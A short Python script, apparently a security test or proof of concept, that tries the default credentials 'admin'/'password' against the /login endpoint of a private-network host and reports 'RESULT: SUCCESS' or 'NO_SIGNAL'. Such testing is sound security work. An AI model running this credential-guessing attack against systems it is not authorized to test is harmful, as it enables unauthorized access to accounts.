import requests

def test_auth_bypass(target_url):
    # Hardcoded payload to bypass authentication
    payload = {
        'username': 'admin',
        'password': 'password'  # Common default credentials often used for auth bypass tests
    }
    
    try:
        # Send post request to login endpoint
        response = requests.post(f"{target_url}/login", data=payload)
        
        # Check if the authentication was successful by looking for a specific success signal
        if "Welcome" in response.text and "<admin>" in response.text:
            print("RESULT: SUCCESS")
            print(response.text)  # Provide evidence of the success
        else:
            print("RESULT: NO_SIGNAL")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

# Define the target URL for testing auth_bypass vulnerability
target_url = "http://192.168.2.69:3000"

test_auth_bypass(target_url)